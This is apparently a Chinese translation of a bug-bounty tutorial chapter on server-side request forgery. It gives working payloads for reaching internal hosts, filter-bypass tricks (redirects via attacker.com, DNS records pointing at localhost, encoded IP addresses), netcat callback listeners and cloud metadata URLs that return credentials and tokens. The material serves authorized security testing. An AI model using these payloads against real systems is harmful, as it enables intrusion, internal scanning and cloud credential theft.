# 第13章：服务器端请求伪造（Server-Side Request Forgery）

服务器端请求伪造（SSRF）是一种允许攻击者代表服务器发送请求的漏洞。在SSRF攻击中，攻击者伪造易受攻击服务器的请求签名，从而能够以网络上的特权位置行动，绕过防火墙控制，并获得对内部服务的访问权限。

在本章中，我们将介绍SSRF的工作原理、如何绕过常见防护措施，以及发现SSRF后如何提升攻击影响。

## 机制

当攻击者找到一种方式以目标网络中受信任服务器的身份发送请求时，就会发生SSRF漏洞。想象example.com网络上有一个面向公众的Web服务器，名为`public.example.com`。该服务器托管一个代理服务，位于`public.example.com/proxy`，用于获取`url`参数中指定的网页并将其显示给用户。例如，当用户访问以下URL时，Web应用程序会显示google.com首页：

```
https://public.example.com/proxy?url=https://google.com
```

现在假设`admin.example.com`是网络上托管管理面板的内部服务器。为确保只有员工可以访问该面板，管理员设置了访问控制，使其无法通过互联网访问。只有具有有效内部IP的机器（如员工工作站）才能访问该面板。

现在，如果普通用户访问以下URL会怎样？

```
https://public.example.com/proxy?url=https://admin.example.com
```

这里，`url`参数被设置为内部管理面板的URL。由于没有SSRF防护机制，Web应用程序会将管理面板显示给用户，因为对管理面板的请求来自Web服务器`public.example.com`——网络上的一台受信任机器。

通过SSRF，服务器接受通常会被防火墙控制阻止的未经授权请求，例如从非公司机器获取管理面板。通常，网络边界（位于面向公众的Web服务器和互联网机器之间）存在的保护措施，在受信任网络上的机器之间并不存在。因此，将管理面板对互联网隐藏的保护措施并不适用于Web服务器和管理面板服务器之间发送的请求。

通过伪造来自受信任服务器的请求，攻击者可以渗透到组织的内部网络并实施各种恶意活动。根据易受攻击的面向公众服务器被授予的权限，攻击者可能能够读取敏感文件、进行内部API调用和访问内部服务。

SSRF漏洞有两种类型：**普通SSRF**和**盲SSRF**。两者的机制相同：都是利用同一网络上机器之间的信任关系。唯一的区别在于，在盲SSRF中，攻击者不会通过HTTP响应或错误消息收到来自服务器的反馈。例如，在前面的示例中，如果我们看到`admin.example.com`被显示出来，就会知道SSRF成功了。但在盲SSRF中，伪造的请求执行后不会向攻击者发送任何确认。

假设`public.example.com`上另一个功能允许用户通过其Web服务器发送请求，但该端点不向用户返回结果页面。如果攻击者可以向内部网络发送请求，则该端点存在盲SSRF漏洞：

```
https://public.example.com/send_request?url=https://admin.example.com/delete_user?user=1
```

虽然盲SSRF更难利用，但对攻击者来说仍然非常有价值，他们可能能够进行网络扫描并利用网络上的其他漏洞。我们稍后会详细讨论。

## 防御措施

当服务器需要发送请求以获取外部资源时，就会发生SSRF。例如，当你在Twitter上发布链接时，Twitter会从该外部站点获取图片以创建缩略图。如果服务器不阻止用户使用相同的机制访问内部资源，就会发生SSRF漏洞。

让我们看另一个例子。假设`public.example.com`上的一个页面允许用户通过从URL检索来上传个人资料照片，使用以下POST请求：

```
POST /upload_profile_from_url
Host: public.example.com
(POST request body)
user_id=1234&url=https://www.attacker.com/profile.jpeg
```

为了从`attacker.com`获取`profile.jpeg`，Web应用程序必须访问并从`attacker.com`检索内容。这是应用程序的安全且预期的行为。但如果服务器不区分内部和外部资源，攻击者可以轻易地请求存储在服务器上的本地文件或网络上的任何其他文件。例如，他们可以发出以下POST请求，这将导致Web服务器获取敏感文件并将其显示为用户的个人资料图片：

```
POST /upload_profile_from_url
Host: public.example.com
(POST request body)
user_id=1234&url=https://localhost/passwords.txt
```

针对SSRF主要有两种防护类型：**黑名单**和**白名单**。黑名单是被禁止地址的列表。如果请求包含黑名单地址作为输入，服务器将阻止该请求。由于应用程序通常需要从各种互联网来源获取资源，数量太多而无法明确允许，大多数应用程序使用这种方法。公司将内部网络地址列入黑名单，并拒绝任何重定向到这些地址的请求。

另一方面，当站点实施白名单防护时，服务器只允许包含预定义列表中URL的请求，并拒绝所有其他请求。一些服务器还通过在内部请求中要求特殊头或秘密令牌来防范SSRF。

## 寻找SSRF

发现SSRF漏洞的最佳方法是通过审查应用程序的源代码，检查应用程序是否验证了所有用户提供的URL。但当你无法获得源代码时，应将精力集中在测试最容易出现SSRF的功能上。

### 第1步：识别容易出现SSRF的功能

SSRF出现在需要访问和获取外部资源的功能中。这些包括Webhook、文件上传、文档和图像处理器、链接展开或缩略图以及代理服务。测试任何处理用户提供URL的端点也是值得的。同时注意不太明显的潜在SSRF入口点，如嵌入在应用程序处理的文件中的URL（XML文件和PDF文件通常可用于触发SSRF）、接受URL作为输入的隐藏API端点，以及被插入HTML标签的输入。

**Webhook**是用作某些应用程序事件通知系统的自定义HTTP回调端点。当新用户注册或应用程序错误等事件发生时，源站点会向Webhook URL发出HTTP请求。这些HTTP请求帮助公司收集有关网站性能和访客的信息，也帮助组织在多个Web应用程序之间保持数据同步。

当一个应用程序的某个操作需要触发另一个应用程序的操作时，Webhook是一种通知系统启动另一个进程的方式。例如，如果公司想向每位关注其社交媒体账户的用户发送欢迎邮件，可以使用Webhook连接两个应用程序。

许多网站允许用户设置其Webhook URL，这些设置页面通常容易受到SSRF攻击。大多数情况下，应用程序的Webhook服务位于其开发者门户中。例如，Slack允许应用程序所有者通过其应用配置页面设置Webhook（https://api.slack.com/apps/）。在Event Subscriptions标题下，你可以指定一个URL，Slack将在特殊事件发生时通知你（图13-1）。这些Webhook服务的Request URL字段通常容易受到SSRF攻击。

另一方面，**代理服务**是指充当两台机器之间中介的服务。它们位于请求的客户端和服务器之间，以促进或控制其通信。代理服务的常见用例包括绕过阻止某些网站的组织防火墙、匿名浏览互联网或加密互联网消息。

*（图13-1：向Slack添加Webhook）*


  ```
  https://public.example.com/proxy?url=https://google.com
  ```

### 第2步：向潜在易受攻击端点提供内部URL

一旦识别出潜在易受攻击的端点，向这些端点提供内部地址作为URL输入。根据网络配置的不同，你可能需要尝试多个地址才能找到网络中正在使用的地址。以下是一些为私有网络保留的常见地址：`localhost`、`127.0.0.1`、`0.0.0.0`、`192.168.0.1`和`10.0.0.1`。

你可以在https://en.wikipedia.org/wiki/Reserved_IP_addresses找到更多用于标识私有网络上机器的保留IP地址。

例如，此请求测试Webhook功能：

```
POST /webhook
Host: public.example.com
(POST request body)
url=https://192.168.0.1
```

此请求测试文件上传功能：

```
POST /upload_profile_from_url
Host: public.example.com
(POST request body)
user_id=1234&url=https://192.168.0.1
```

此请求测试代理服务：

```
https://public.example.com/proxy?url=https://192.168.0.1
```

### 第3步：检查结果

在普通SSRF的情况下，查看服务器是否返回了揭示内部服务任何信息的响应。例如，响应是否包含服务横幅或内部页面内容？**服务横幅**是在机器上运行的软件的名称和版本。通过发送如下请求来检查：

```
POST /upload_profile_from_url
Host: public.example.com
(POST request body)
user_id=1234&url=127.0.0.1:22
```

端口22是安全外壳协议（SSH）的默认端口。此请求告诉应用程序我们的个人资料图片URL位于`127.0.0.1:22`，即当前机器的22端口。这样，我们可以诱骗服务器访问自己的22端口并返回关于自身的信息。然后在响应中查找类似这样的文本：

```
Error: cannot upload image: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
```

如果找到这样的消息，你可以确定该端点存在SSRF漏洞，因为你能够收集到关于localhost的信息。

检测盲SSRF的最简单方法是通过**带外技术**：你让目标向你控制的外部服务器发送请求，然后监控服务器日志中来自目标的请求。一种方法是使用提供服务器访问日志的在线托管服务，如GoDaddy或Hostinger。你可以将托管站点链接到自定义域名，并在SSRF测试载荷中提交该域名。

你也可以通过使用Netcat将自己的机器变成监听器，Netcat是大多数Linux机器上默认安装的实用程序。如果还没有Netcat，可以使用命令`apt-get install netcat`安装。然后使用`nc -lp 8080`在8080端口启动监听器。之后，你可以将SSRF载荷指向你在8080端口的IP地址，并监控任何传入流量。另一种更简单的方法是使用Burp Suite Pro中的Collaborator功能，它会自动生成唯一域名，将其作为载荷发送到目标，并监控与目标相关的任何交互。

然而，仅能从目标服务器生成出站请求本身并不是可利用的问题。由于你无法使用盲SSRF读取内部文件或访问内部服务，你需要通过尝试使用SSRF探索内部网络来确认其可利用性。向各种目标端口发出请求，观察服务器在常用开放端口和关闭端口之间的行为差异。例如，端口22、80和443是常用的开放端口，而端口11不是。这将帮助你确定攻击者是否可以使用SSRF访问内部网络。特别关注响应时间和HTTP响应码的差异。

例如，服务器使用HTTP状态码200表示请求成功。通常，如果服务器能够连接到指定端口，它将返回200状态码。假设以下请求返回HTTP状态码200：

```
POST /webhook
Host: public.example.com
(POST request body)
url=https://127.0.0.1:80
```

而以下请求返回HTTP状态码500（内部服务器错误）。服务器在处理请求时遇到错误时会返回500状态码，因此500状态码通常表示端口关闭或受保护：

```
POST /webhook
Host: public.example.com
(POST request body)
url=https://127.0.0.1:11
```

你可以确认服务器确实在向这些端口发出请求，并根据端口状态做出不同响应。

还要观察响应之间的时间差异。从图13-2中可以看到，Burp Repeater在右下角显示了服务器响应所花费的时间。在这里，Google返回其首页花费了181毫秒。你可以使用SSRFmap（https://github.com/swisskyrepo/SSRFmap/）等工具自动化此过程。

*（图13-2：Burp Repeater显示服务器响应请求所花费的时间。）*

如果端口关闭，服务器通常响应更快，因为它会立即丢弃转发的流量，而内部防火墙通常会导致响应延迟。攻击者可以利用时间延迟作为指标来推断目标的内部网络结构。如果你能识别出对不同端口请求之间的显著时间差异，就找到了一个可利用的SSRF。

## 绕过SSRF防护

如果你提交了SSRF载荷，但服务器返回了此响应会怎样？

```
Error. Requests to this address are not allowed. Please try again.
```

此SSRF被防护机制阻止了，可能是URL白名单或黑名单。但并非全无希望！站点可能有实施的防护机制，但这并不意味着防护是完整的。以下是你可以尝试绕过站点防护的几种方法。

### 绕过白名单

白名单通常最难绕过，因为它们在默认情况下比黑名单更严格。但如果你能在白名单域内找到开放重定向漏洞，仍然有可能绕过它们。（有关这些漏洞的更多信息，请访问第7章。）如果找到了，你可以请求一个白名单URL，该URL重定向到内部URL。

例如，即使站点只允许从其子域之一上传个人资料图片，你也可以通过开放重定向诱导SSRF。在以下请求中，我们利用`pics.example.com`上的开放重定向将请求重定向到`127.0.0.1`（localhost的IP地址）。这样，即使`url`参数通过了白名单，它仍然重定向到受限的内部地址：

```
POST /upload_profile_from_url
Host: public.example.com
(POST request body)
user_id=1234&url=https://pics.example.com/123?redirect=127.0.0.1
```

服务器也可能通过设计不佳的正则表达式来实现其白名单。正则表达式通常用于构造更灵活的白名单。例如，站点可以不检查URL字符串是否等于`"example.com"`，而是检查像`.*example.com.*`这样的正则表达式来同时匹配example.com的子域和文件路径。在这种情况下，你可以通过在白名单域中放置允许的域来绕过正则表达式。例如，此请求将重定向到`127.0.0.1`，因为`pics.example.com`被视为URL的用户名部分：

```
POST /upload_profile_from_url
Host: public.example.com
(POST request body)
user_id=1234&url=https://pics.example.com@127.0.0.1
```

以下请求也重定向到`127.0.0.1`，因为`pics.example.com`被视为URL的目录部分：

```
POST /upload_profile_from_url
Host: public.example.com
(POST request body)
user_id=1234&url=https://127.0.0.1/pics.example.com
```

你可以通过尝试类似这样的URL并查看过滤器是否允许来测试站点是否使用了过于灵活的正则表达式白名单。请注意，如果正则表达式构造良好，基于正则表达式的白名单可以是安全的。而且这些URL并不总是能成功！

### 绕过黑名单

由于应用程序通常需要从各种互联网来源获取资源，大多数SSRF防护机制以黑名单的形式出现。如果你面对的是黑名单，有很多方法可以欺骗服务器。

#### 使用重定向欺骗

首先，你可以让服务器请求你控制的URL，该URL重定向到被列入黑名单的地址。例如，你可以让目标服务器向你自己的服务器发送请求：

```
https://public.example.com/proxy?url=https://attacker.com/ssrf
```

然后，在你位于`https://attacker.com/ssrf`的服务器上，你可以托管包含以下内容的文件：

```php
<?php header("location: http://127.0.0.1"); ?>
```

这是一段PHP代码，通过将文档位置设置为`127.0.0.1`来重定向请求。当你让目标服务器请求`https://attacker.com/ssrf`时，目标服务器被重定向到`http://127.0.0.1`——一个受限的内部地址。此攻击将绕过黑名单，因为提交给应用程序的URL本身不包含任何被列入黑名单的地址。

#### 使用IPv6地址

我在第3章中提到，IPv6地址是更常用的IPv4地址的较新替代方案。随着世界开始耗尽可用的IPv4地址，需要一种提供更多可能地址的格式，互联网工程任务组（IETF）创建了IPv6地址。IPv6地址是128位值，以十六进制表示法表示，看起来像这样：`64:ff9b::255.255.255.255`。

有时站点为IPv4实施的SSRF防护机制可能没有为IPv6实施。这意味着你可以尝试提交指向本地网络的IPv6地址。例如，IPv6地址`::1`指向localhost，`fc00::`是私有网络上的第一个地址。

有关IPv6工作原理及其他保留IPv6地址的更多信息，请访问维基百科：https://en.wikipedia.org/wiki/IPv6_address。

#### 使用DNS欺骗服务器

你也可以尝试用DNS记录迷惑服务器，计算机使用DNS记录将主机名转换为IP地址。DNS记录有各种类型，但你最常听到的是A和AAAA记录。A记录将主机名指向IPv4地址，而AAAA记录将主机名转换为IPv6地址。

修改你控制的域名的A/AAAA记录，使其指向受害者网络上的内部地址。你可以通过运行以下命令检查域名的当前A/AAAA记录：

```bash
nslookup DOMAIN
nslookup DOMAIN -type=AAAA
```

你通常可以使用域名注册商或Web托管服务的设置页面来配置域名的DNS记录。例如，我使用Namecheap作为域名服务。在Namecheap中，你可以通过进入账户并选择Domain List → Manage Domain → Advanced DNS → Add New Record来配置DNS记录。创建主机名到IP地址的自定义映射，使你的域名解析到`127.0.0.1`。你可以通过为域名创建指向`127.0.0.1`的新A记录来实现。

然后你可以让目标服务器向你的服务器发送请求，例如：

```
https://public.example.com/proxy?url=https://attacker.com
```

现在当目标服务器请求你的域名时，它会认为你的域名位于`127.0.0.1`并从该地址请求数据。

#### 切换编码

有许多方法可以对URL或地址进行编码。字符编码是在保持字符含义的同时表示相同字符的不同方式，通常用于使数据传输或存储更高效。这些编码方法不会改变服务器解释地址位置的方式，但如果黑名单只禁止以特定方式编码的地址，它们可能允许输入逃避检测。

可能的编码方法包括十六进制编码、八进制编码、双字编码、URL编码和混合编码。如果目标服务器的URL解析器没有正确处理这些编码方法，你可能能够绕过SSRF保护。到目前为止，本书中作为示例提供的地址都使用十进制编码——一种使用0到9字符的基10格式。

要将十进制格式的IP地址转换为十六进制，将IP地址的每个由点分隔的部分计算为其十六进制等效值。你可以使用十进制到十六进制计算器来完成，然后组合整个地址。例如，十进制的`127.0.0.1`转换为十六进制的`0x7f.0x0.0x0.0x1`。每个部分开头的`0x`表示它是一个十六进制数。然后你可以在潜在SSRF端点中使用十六进制地址：

```
https://public.example.com/proxy?url=https://0x7f.0x0.0x0.0x1
```

**八进制编码**是使用0到7字符以基8格式表示字符的方式。与十六进制类似，你可以通过重新计算每个部分将IP地址转换为八进制形式。你也可以使用在线计算器；只需搜索“decimal to octal calculator”。例如，`127.0.0.1`转换为`0177.0.0.01`。在这种情况下，前导零是必要的，以表示该部分是八进制数。然后在潜在SSRF端点中使用它：

```
https://public.example.com/proxy?url=https://0177.0.0.01
```

**双字（dword）编码**方案将IP地址表示为一个32位整数（称为双字）。要将地址转换为双字，将地址分成四个八位组（每组8位），并写出其二进制表示。例如，`127.0.0.1`是`01111111.00000000.00000000.00000001`的十进制表示。当我们将整个数字`01111111000000000000000000000001`转换为一个十进制数时，就得到了双字格式的IP地址。

`127.0.0.1`的双字格式是多少？它是`127 × 256³ + 0 × 256² + 0 × 256¹ + 1 × 256⁰`的结果，即`2130706433`。你可以使用二进制到十进制计算器来计算。如果在浏览器中输入`https://2130706433`而不是`https://127.0.0.1`，它仍然会被理解，你可以在潜在SSRF端点中使用它：

```
https://public.example.com/proxy?url=https://2130706433
```

当服务器阻止对内部主机名（如`https://localhost`）的请求时，尝试其URL编码等效形式：

```
https://public.example.com/proxy?url=https://%6c%6f%63%61%6c%68%6f%73%74
```

最后，你可以使用编码技术的组合来试图迷惑黑名单。例如，在地址`0177.0.0.0x1`中，第一部分使用八进制编码，接下来两个使用十进制编码，最后一部分使用十六进制编码。

这只是你可以尝试的一小部分绕过方法。你可以使用更多创造性的方式来击败防护并实现SSRF。当你找不到有效的绕过方法时，换个角度思考：问自己，我会如何为此功能实现防护机制？设计你认为防护逻辑可能的样子。然后尝试绕过你设计的机制。这可行吗？在实施防护时你是否遗漏了什么？应用程序的开发人员是否也可能遗漏了什么？

## 提升攻击影响

SSRF的影响各不相同，但如果你知道如何将其与不同的漏洞链接起来，它们有很大的潜力。现在你已掌握SSRF的基础知识，让我们学习如何最有效地利用它们。

通过SSRF能实现什么通常取决于网络上发现的内部服务。根据情况，你可以使用SSRF扫描网络上的可达主机、对内部机器进行端口扫描以识别内部服务、收集实例元数据、绕过访问控制、泄露机密数据，甚至在可达机器上执行代码。

### 执行网络扫描

有时你可能想要扫描网络上其他可达机器。**可达机器**是可以通过当前机器连接到的其他网络主机。这些内部机器可能托管数据库、内部网站和其他敏感功能，攻击者可以利用这些功能获利。要执行扫描，向易受攻击端点提供一系列内部IP地址，并观察服务器对每个地址的响应是否不同。例如，当你请求地址`10.0.0.1`时：

```
POST /upload_profile_from_url
Host: public.example.com
(POST request body)
user_id=1234&url=https://10.0.0.1
```

服务器可能响应此消息：

```
Error: cannot upload image: http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
```

但当你请求地址`10.0.0.2`时：

```
POST /upload_profile_from_url
Host: public.example.com
(POST request body)
user_id=1234&url=https://10.0.0.2
```

服务器可能响应此消息：

```
Error: cannot upload image: Connection Failed
```

你可以推断`10.0.0.1`是网络上有效主机的地址，而`10.0.0.2`不是。利用服务器行为的差异，你可以收集关于网络结构的信息，如可达主机的数量及其IP地址。

你也可以使用SSRF对网络机器进行端口扫描，揭示这些机器上运行的服务。开放端口提供了机器上运行的服务的良好指示，因为服务通常在特定端口上运行。例如，默认情况下，SSH在22端口运行，HTTP在80端口运行，HTTPS在443端口运行。端口扫描结果通常指向你应该手动检查的端口，并帮助你计划针对所发现服务的进一步攻击。

向易受攻击端点提供不同端口号，然后确定服务器行为在端口之间是否不同。过程与扫描主机相同，只是这次切换端口号而不是主机。端口号范围从0到65,535。

假设你想找出内部机器上哪些端口是开放的。当你向内部机器上的80端口发送请求时，服务器响应此消息：

```
Error: cannot upload image: http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
```

当你向同一机器上的11端口发送请求时，机器响应此消息：

```
Error: cannot upload image: Connection Failed
```

我们可以推断该机器上的80端口是开放的，而11端口不是。你也可以从响应中判断该机器正在运行Apache Web服务器和Ubuntu Linux发行版。你可以利用此处揭示的软件信息构造针对系统的进一步攻击。

### 获取实例元数据

云计算服务允许企业在其他人的服务器上运行其应用程序。其中一项服务——Amazon Elastic Compute Cloud（EC2）——提供了一个实例元数据工具，使EC2实例能够通过查询`169.254.169.254`的API端点来访问有关自身的数据。实例是在云提供商基础设施上运行应用程序的虚拟服务器。Google Cloud提供了类似的实例元数据API服务。

除非网络管理员特别阻止或禁用，否则这些API端点默认是可访问的。这些服务揭示的信息通常非常敏感，可能允许攻击者将SSRF升级为严重的信息泄露甚至RCE。

#### 查询EC2元数据

如果公司在Amazon EC2上托管其基础设施，尝试使用此端点查询有关主机的各种实例元数据。例如，此API请求从正在运行的实例获取所有实例元数据：

```
http://169.254.169.254/latest/meta-data/
```

在易受SSRF攻击的端点中使用此URL：

```
https://public.example.com/proxy?url=http://169.254.169.254/latest/meta-data/
```

这些端点揭示诸如API密钥、Amazon S3令牌（用于访问Amazon S3存储桶的令牌）和密码等信息。尝试请求这些特别有用的API端点：

- `http://169.254.169.254/latest/meta-data/` 返回可查询的可用元数据列表。
- `http://169.254.169.254/latest/meta-data/local-hostname/` 返回主机使用的内部主机名。
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME` 返回该角色的安全凭据。
- `http://169.254.169.254/latest/dynamic/instance-identity/document/` 揭示当前实例的私有IP地址。
- `http://169.254.169.254/latest/user-data/` 返回当前实例上的用户数据。

你可以在https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html找到API端点的完整文档。

#### 查询Google Cloud元数据

如果公司使用Google Cloud，请查询Google Instance Metadata API。Google对其API端点实施了额外的安全措施，因此查询Google Cloud Metadata APIv1需要以下特殊头之一：

```
Metadata-Flavor: Google
X-Google-Metadata-Request: True
```

这些头提供SSRF防护，因为在SSRF期间，你通常无法为伪造请求指定特殊头。但你可以轻松绕过此防护，因为通过APIv1可访问的大多数端点也可以通过API v1beta1端点访问。API v1beta1是元数据API的较旧版本，没有相同的头要求。首先针对这些关键端点：

- `http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token` 返回实例上默认账户的访问令牌。
- `http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys` 返回可以连接到该项目中其他实例的SSH密钥。

阅读完整API文档：https://cloud.google.com/compute/docs/storing-retrieving-metadata。请注意，API v1beta1于2020年被弃用，正在逐步关闭。将来，你可能需要使用APIv1查询元数据，并需要找到一种方法来伪造所需的头以请求使用Google Cloud的目标的实例元数据。

Amazon和Google并不是唯一提供元数据API的Web服务。然而，这两家公司控制了大部分市场份额，因此你正在测试的公司很可能在这些平台之一上。如果不是，DigitalOcean和Kubernetes集群也容易受到同样的问题影响。例如，对于DigitalOcean，你可以通过访问`http://169.254.169.254/metadata/v1/`端点来获取元数据端点列表，然后检索关键信息，如实例的主机名和用户数据。对于Kubernetes，尝试访问`https://kubernetes.default`和`https://kubernetes.default.svc/metrics`以获取有关系统的信息。

### 利用盲SSRF

由于盲SSRF不返回响应或错误消息，其利用通常限于网络映射、端口扫描和服务发现。此外，由于你无法直接从目标服务器提取信息，这种利用在很大程度上依赖于推断。然而，通过分析HTTP状态码和服务器响应时间，我们通常可以达到与普通SSRF类似的结果。

#### 使用HTTP状态码进行网络和端口扫描

回忆第5章，HTTP状态码提供关于请求是否成功的信息。通过比较对不同端点请求返回的响应码，我们可以推断哪些是有效的。例如，如果对`https://public.example.com/webhook?url=10.0.0.1`的请求返回HTTP状态码200，而对`https://public.example.com/webhook?url=10.0.0.2`的请求返回HTTP状态码500，我们可以推断`10.0.0.1`是网络上有效主机的地址，而`10.0.0.2`不是。

使用盲SSRF进行端口扫描的工作方式相同。如果服务器对某些端口返回200状态码，对其他端口返回500，200状态码可能表示机器上的开放端口。另一方面，如果所有请求返回相同的状态码，站点可能已实施针对SSRF端口扫描的防护。

#### 使用服务器响应时间进行网络和端口扫描

如果服务器没有以状态码的形式返回任何有用信息，你仍然可以通过检查服务器响应请求所花费的时间来推断网络结构。如果某些地址响应时间明显更长，这些网络地址可能是未路由的或隐藏在防火墙后面。未路由地址无法从当前机器到达。另一方面，异常短的响应时间也可能表示未路由地址，因为路由器可能立即丢弃了请求。

在执行任何类型的网络或端口扫描时，重要的是要记住机器行为不同。关键是要寻找同一网络上机器之间的行为差异，而不是像响应时间或响应码这样的具体特征。

目标机器也可能在出站请求中泄露敏感信息，如内部IP、头和使用软件的版本号。如果你无法访问内部地址，你可以尝试向易受攻击端点提供你自己服务器的地址，并查看可以从传入请求中提取什么。

### 攻击网络

利用通过网络扫描、识别服务和获取实例元数据所发现的信息来执行有影响力的攻击。值得注意的是，你可能能够绕过访问控制、泄露机密信息和执行代码。

首先，尝试绕过访问控制。一些内部服务可能仅基于IP地址或内部头来控制访问，因此可能只需从受信任机器发送请求即可绕过对敏感功能的控制。例如，你可能能够通过代理Web服务器访问内部网站：

```
https://public.example.com/proxy?url=https://admin.example.com
```

你也可以尝试通过SSRF端点执行内部API调用。这类攻击需要了解内部系统和API语法，你可以通过侦察和系统的其他信息泄露来获得。例如，假设API端点`admin.example.com/delete_user`删除用户，且只能由内部地址请求。如果你发现一个SSRF允许你从受信任网络中的机器发送请求，就可以触发该请求：

```
https://public.example.com/send_request?url=https://admin.example.com/delete_user?user=1
```

其次，如果你能够通过SSRF利用头信息泄露或查询实例元数据找到凭据，请使用这些凭据访问存储在网络上的机密信息。例如，如果你能够找到Amazon S3密钥，枚举公司的私有S3存储桶，并查看是否可以使用找到的凭据访问它们。

第三，使用你收集的信息将SSRF转换为远程代码执行（你将在第18章了解更多）。例如，如果你找到了具有写入权限的管理员凭据，尝试将Shell上传到Web服务器。或者，如果你找到了不安全的控制面板，查看是否有任何功能允许执行脚本。你也可以使用普通或盲SSRF通过向可达机器发送设计用于检测已知漏洞的载荷来测试目标网络上的其他漏洞。

## 找到你的第一个SSRF！

让我们回顾一下你可以用来找到第一个SSRF的步骤：

1. **识别容易出现SSRF的功能**，并做记录以供将来参考。
2. **设置回调监听器**以检测盲SSRF，使用在线服务、Netcat或Burp的Collaborator功能。
3. **向潜在易受攻击端点提供常见的内部地址**或你的回调监听器地址。
4. **检查服务器是否响应了确认SSRF的信息**。在盲SSRF的情况下，检查服务器日志中来自目标服务器的请求。
5. **在盲SSRF的情况下**，检查当你请求不同主机或端口时服务器行为是否不同。
6. **如果实施了SSRF防护**，尝试使用本章讨论的策略绕过它。
7. **选择一种策略来提升SSRF的影响**。
8. **起草你的第一份SSRF报告！**
